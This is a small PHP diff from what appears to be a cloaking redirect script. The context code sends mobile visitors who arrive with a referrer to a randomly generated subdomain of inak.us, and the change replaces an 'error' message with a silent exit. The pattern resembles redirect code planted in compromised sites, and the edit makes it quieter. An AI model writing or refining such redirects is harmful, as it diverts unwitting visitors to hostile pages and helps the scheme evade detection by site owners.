@@ -63,7 +63,7 @@ if($detect->isMobile() || $browser->isMobile()){
   if($isref == true){
     header("Location:http://".generate_name(rand(5,6)).".inak.us/".$filename);
   }else{
-    exit("error");
+    exit();
   }
   exit();
 }else{
